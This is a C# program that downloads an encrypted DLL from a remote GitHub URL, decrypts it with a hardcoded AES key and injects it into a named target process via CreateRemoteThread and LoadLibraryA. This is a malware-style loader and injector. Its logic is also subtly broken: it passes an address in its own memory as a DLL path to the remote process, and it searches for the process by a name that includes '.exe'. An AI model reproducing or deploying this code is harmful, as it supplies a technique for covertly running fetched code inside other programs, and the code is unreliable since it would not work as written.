using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

public class EncryptedDllLoader
{
    private static readonly string Key = "70ebd74adcc74271"; // Replace with a strong secret key
    private static readonly byte[] IV = Encoding.UTF8.GetBytes("1234567890123456"); // Replace with a strong initialization vector

    private static readonly string DllUrl = "https://raw.githubusercontent.com/99119240/Methods/main/dll/gui.dll.encrypted"; // Replace with the actual URL

    public static void Main()
    {
        try
        {
            Console.WriteLine("[Debug] Downloading the encrypted DLL...");
            byte[] encryptedDllBytes = DownloadFile(DllUrl);

            Console.WriteLine("[Debug] Decrypting the DLL...");
            byte[] decryptedDllBytes = Decrypt(encryptedDllBytes, Key, IV);

            Console.WriteLine("[Debug] Loading the decrypted DLL into memory...");
            IntPtr dllMemoryAddress = LoadDllIntoMemory(decryptedDllBytes);

            Console.WriteLine("[Debug] Waiting for the target process...");
            string targetProcessName = "GFXTest64.exe"; // Replace with the name of your target process
            WaitForTargetProcess(targetProcessName);

            Console.WriteLine("[Debug] Getting the target process ID...");
            int targetProcessId = GetProcessIdByName(targetProcessName);

            Console.WriteLine("[Debug] Injecting the DLL into the target process...");
            if (targetProcessId != -1)
            {
                InjectDllIntoProcess(targetProcessId, dllMemoryAddress);
                Console.WriteLine($"DLL successfully injected into process '{targetProcessName}'.");
            }
            else
            {
                Console.WriteLine($"Target process '{targetProcessName}' not found.");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error: {ex.Message}");
        }
    }

    private static byte[] DownloadFile(string url)
    {
        using (WebClient client = new WebClient())
        {
            return client.DownloadData(url);
        }
    }

    private static byte[] Decrypt(byte[] encryptedData, string key, byte[] iv)
    {
        using (Aes aesAlg = Aes.Create())
        {
            aesAlg.Key = Encoding.UTF8.GetBytes(key);
            aesAlg.IV = iv;

            ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

            using (MemoryStream msDecrypt = new MemoryStream(encryptedData))
            {
                using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                {
                    using (MemoryStream resultStream = new MemoryStream())
                    {
                        byte[] buffer = new byte[1024];
                        int bytesRead;
                        while ((bytesRead = csDecrypt.Read(buffer, 0, buffer.Length)) > 0)
                        {
                            resultStream.Write(buffer, 0, bytesRead);
                        }
                        return resultStream.ToArray();
                    }
                }
            }
        }
    }

    private static IntPtr LoadDllIntoMemory(byte[] dllBytes)
    {
        IntPtr processHandle = GetCurrentProcessHandle();

        IntPtr dllMemoryAddress = VirtualAllocEx(processHandle, IntPtr.Zero, (uint)dllBytes.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ReadWrite);

        WriteProcessMemory(processHandle, dllMemoryAddress, dllBytes, (uint)dllBytes.Length, out _);

        return dllMemoryAddress;
    }

    private static IntPtr GetCurrentProcessHandle()
    {
        return Process.GetCurrentProcess().Handle;
    }

    private static void WaitForTargetProcess(string processName)
    {
        while (GetProcessIdByName(processName) == -1)
        {
            Thread.Sleep(1000); // Sleep for 1 second and check again
        }
    }

    private static int GetProcessIdByName(string processName)
    {
        Process[] processes = Process.GetProcessesByName(processName);
        return processes.Length > 0 ? processes[0].Id : -1;
    }

    private static void InjectDllIntoProcess(int processId, IntPtr dllMemoryAddress)
    {
        IntPtr processHandle = OpenProcess(ProcessAccessFlags.All, false, processId);

        Console.WriteLine("[Debug] Getting the address of the LoadLibraryA function in kernel32.dll...");
        IntPtr loadLibraryAddress = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

        Console.WriteLine("[Debug] Creating a remote thread to call LoadLibraryA with the DLL path...");
        IntPtr thread = CreateRemoteThread(processHandle, IntPtr.Zero, 0, loadLibraryAddress, dllMemoryAddress, 0, IntPtr.Zero);

        Console.WriteLine("[Debug] Waiting for the remote thread to finish...");
        WaitForSingleObject(thread, 0xFFFFFFFF);

        Console.WriteLine("[Debug] Closing the handle to the remote thread...");
        CloseHandle(thread);

        Console.WriteLine("[Debug] Freeing the memory allocated for the DLL in the target process...");
        VirtualFreeEx(processHandle, dllMemoryAddress, 0, AllocationType.Release);

        Console.WriteLine("[Debug] Closing the handle to the target process...");
        CloseHandle(processHandle);

        Console.WriteLine("[Debug] DLL injection complete.");
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType dwFreeType);

    [DllImport("kernel32.dll")]
    private static extern IntPtr WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [Flags]
    private enum ProcessAccessFlags : uint
    {
        All = 0x001F0FFF,
        Terminate = 0x00000001,
        CreateThread = 0x00000002,
        VMOperation = 0x00000008,
        VMRead = 0x00000010,
        VMWrite = 0x00000020,
        DupHandle = 0x00000040,
        SetInformation = 0x00000200,
        QueryInformation = 0x00000400,
        Synchronize = 0x00100000
    }

    [Flags]
    private enum AllocationType
    {
        Commit = 0x1000,
        Reserve = 0x2000,
        Decommit = 0x4000,
        Release = 0x8000,
        Reset = 0x80000,
        Physical = 0x400000,
        TopDown = 0x100000,
        WriteWatch = 0x200000,
        LargePages = 0x20000000
    }

    [Flags]
    private enum MemoryProtection
    {
        Execute = 0x10,
        ExecuteRead = 0x20,
        ExecuteReadWrite = 0x40,
        ExecuteWriteCopy = 0x80,
        NoAccess = 0x01,
        ReadOnly = 0x02,
        ReadWrite = 0x04,
        WriteCopy = 0x08,
        GuardModifierflag = 0x100,
        NoCacheModifierflag = 0x200,
        WriteCombineModifierflag = 0x400
    }
}
